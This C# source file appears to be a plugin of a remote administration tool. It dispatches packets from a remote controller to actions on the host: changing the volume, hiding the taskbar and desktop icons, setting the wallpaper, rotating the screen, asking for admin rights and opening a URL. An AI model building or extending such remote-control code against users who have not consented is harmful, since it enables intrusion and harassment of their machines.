﻿using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(LoadingAPI loadingAPI)
        {
            switch (loadingAPI.CurrentPacket.PacketType) 
            {
                case PacketType.MISC_AUDIO_UP:
                    Audio.IncreaseVolume();
                    break;

                case PacketType.MISC_AUDIO_DOWN:
                    Audio.DecreaseVolume();
                    break;

                case PacketType.MISC_HIDE_TASKBAR:
                    UI.HideTaskBar();
                    break;

                case PacketType.MISC_SHOW_TASKBAR:
                    UI.ShowTaskBar();
                    break;

                case PacketType.MISC_SET_WALLPAPER:
                    WallPaperPacket wallPaperPacket = (WallPaperPacket)loadingAPI.CurrentPacket;
                    UI.SetWallpaper(Compressor.QuickLZ.Decompress(wallPaperPacket.wallpaper), wallPaperPacket.ext);
                    break;

                case PacketType.MISC_HIDE_DESKTOP_ICONS:
                    UI.HideDesktopIcons();
                    break;

                case PacketType.MISC_SHOW_DESKTOP_ICONS:
                    UI.ShowDesktopIcons();
                    break;

                case PacketType.MISC_SCREEN_ROTATION:
                    ScreenRotationPacket screenRotationPacket = (ScreenRotationPacket)loadingAPI.CurrentPacket;
                    ScreenRotation.Rotate(screenRotationPacket.degrees);
                    break;

                case PacketType.MISC_ASK_ADMIN_RIGHTS:
                    Admin.AskAdminRight();
                    break;

                case PacketType.MISC_OPEN_WEBSITE_LINK:
                    Link.OpenLink(((OpenUrlPacket)loadingAPI.CurrentPacket).url);
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
    }
}
